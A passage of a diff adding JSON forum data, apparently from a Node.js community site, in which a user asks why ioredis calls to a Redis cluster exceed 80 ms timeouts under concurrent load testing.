+              "avatar_url" : "https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"
+          }
+      },
+      {
+          "id" : "57fda8290bab808265185cd0",
+          "author_id" : "57fda6600bab808265185ccd",
+          "tab" : "ask",
+          "content" : "<div class=\"markdown-text\"><p>在高并发压力测试下ioredis访问redis集群在同一秒中有多个超时80毫秒以上的，请问专家门知道是什么问题吗？\n并发测试数据有：\n50并发，大于80毫秒的超时数有72次。\n100并发，大于80毫秒的超时数有202次。</p>\n<p>硬件配置：4核16G ，2台虚拟机</p>\n</div>",
+          "title" : "ioredis访问redis集群超时",
+          "last_reply_at" : "2018-12-04T14:06:57.279Z",
+          "good" : false,
+          "top" : false,
+          "reply_count" : 12,
+          "visit_count" : 1781,
+          "create_at" : "2016-10-12T03:04:09.715Z",
+          "author" : {
+              "loginname" : "zhaozhi1989",
+              "avatar_url" : "https://avatars.githubusercontent.com/u/22743006?v=3&s=120"
+          }
+      }
+  ],
+  "__v" : 0
+}
